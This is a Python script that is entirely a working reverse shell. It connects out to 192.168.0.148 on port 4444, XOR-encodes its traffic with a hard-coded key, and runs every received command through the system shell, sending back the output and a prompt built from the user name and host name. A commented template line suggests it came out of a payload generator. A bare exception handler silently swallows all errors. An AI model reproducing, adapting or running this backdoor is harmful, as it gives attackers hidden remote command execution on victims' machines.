
from subprocess import Popen, PIPE
from re import sub
import os, socket, getpass

key = b'111111111101111111111101111111111111111111111111111111111111111111111111111111111111111111111111111101' \
	  b'111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111' \
	  b'111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111' \
	  b'111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111' \
	  b'111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111' \
	  b'111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111' \
	  b'111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111' \
	  b'111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111' \
	  b'111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111' \
	  b'111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111' \
	  b'000111111101111111011111111111111111111111111111111111111111111111111111111111111111111111111111111101' \
	  b'111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111' \
	  b'111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111' \
	  b'111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111' \
	  b'111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111' \
	  b'111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111' \
	  b'111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111' \
	  b'111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111' \
	  b'111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111' \
	  b'111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111' \
	  b'000111111101111111011111111111111111111111111111111111111111111111111111111111111111111111111111111101' \
	  b'111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111' \
	  b'111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111' \
	  b'111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111' \
	  b'111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111' \
	  b'111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111' \
	  b'111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111' \
	  b'111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111' \
	  b'111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111' \
	  b'111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111' \
	  b'000111111101111111011111111111111111111111111111111111111111111111111111111111111111111111111111111101' \
	  b'111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111' \
	  b'111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111' \
	  b'111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111' \
	  b'111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111' \
	  b'111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111' \
	  b'111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111' \
	  b'111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111' \
	  b'111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111' \
	  b'111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111' \
	  b'000111111101111111011111111111111111111111111111111111111111111111111111111111111111111111111111111101' \
	  b'111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111' \
	  b'111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111' \
	  b'111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111' \
	  b'111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111' \
	  b'111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111' \
	  b'111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111' \
	  b'111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111' \
	  b'111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111' \
	  b'111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111' \
	  b'000111111101111111011111111111111111111111111111111111111111111111111111111111111111111111111111111101' \
	  b'111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111' \
	  b'111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111' \
	  b'111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111' \
	  b'111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111' \
	  b'111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111' \
	  b'111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111' \
	  b'111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111' \
	  b'111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111' \
	  b'111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111' \
	  b'000111111101111111011111111111111111111111111111111111111111111111111111111111111111111111111111111101' \
	  b'111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111' \
	  b'111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111' \
	  b'111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111' \
	  b'111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111' \
	  b'111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111' \
	  b'111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111' \
	  b'111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111' \
	  b'111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111' \
	  b'111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111' \
	  b'000111111101111111011111111111111111111111111111111111111111111111111111111111111111111111111111111101' \
	  b'111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111' \
	  b'111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111' \
	  b'111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111' \
	  b'111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111' \
	  b'111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111' \
	  b'111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111' \
	  b'111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111' \
	  b'111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111' \
	  b'111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111' \
	  b'000111111101111111011111111111111111111111111111111111111111111111111111111111111111111111111111111101' \
	  b'111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111' \
	  b'111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111' \
	  b'111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111' \
	  b'111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111' \
	  b'111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111' \
	  b'111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111' \
	  b'111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111' \
	  b'111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111' \
	  b'111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111' \
	  b'000111111101111111011111111111111111111111111111111111111111111111111111111111111111111111111111111101' \
	  b'111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111' \
	  b'111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111' \
	  b'111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111' \
	  b'111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111' \
	  b'111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111' \
	  b'111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111' \
	  b'111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111' \
	  b'111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111' \
	  b'111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111'

def getcmdline(path, winflag):
	if winflag:
		cmdline = path + '>'
	else:
		cmdline=getpass.getuser()+'@'+socket.gethostname()+':'+path+'$'
	return cmdline

def stringxor(s1,s2):
    return ''.join(chr(ord(a) ^ ord(b)) for a,b in zip(s1,s2))

def byte_xor(ba1, ba2):
    return bytes([_a ^ _b for _a, _b in zip(ba1, ba2)])

def encode_xor(data):
	data = data.encode()
	data = byte_xor(data,key)
	return data

def xor_decode(data):
	data = byte_xor(data,key)
	data = data.decode()
	return data

try:

	s = socket.socket()
	# s.connect(('"""+lhost.strip()+"""', """+str(lport).strip()+"""))
	s.connect(("192.168.0.148", 4444))
	winflag=0
	if os.name == "nt":
		winflag = 1
	cmdline = getcmdline(os.getcwd(),winflag)
	s.send(encode_xor(cmdline))
	# s.send(cmdline.encode())
	while True:
		data = s.recv(1024000)
		data = xor_decode(data)
		# data = data.decode()
		test = Popen(data, shell=True, stdout=PIPE, stdin=PIPE, stderr=PIPE) if winflag else Popen(data, shell=True, executable="/bin/bash", stdout=PIPE, stdin=PIPE, stderr=PIPE)
		out = test.stdout.read()
		err = test.stderr.read()
		op = out + err
		if len(data) > 3 and data[0: 3] == "cd ":
			path = sub("^\s*cd\s+", "",data)
			if os.path.exists(path):
				os.chdir(path)
				path = os.getcwd()
				cmdline = getcmdline(path,winflag)


		# data_send = op+('\n'+cmdline).encode()
		# s.send(data_send)
		x = ('\n' + cmdline).encode()
		data_send = op + x
		s.send(byte_xor(data_send,key))

except:
	pass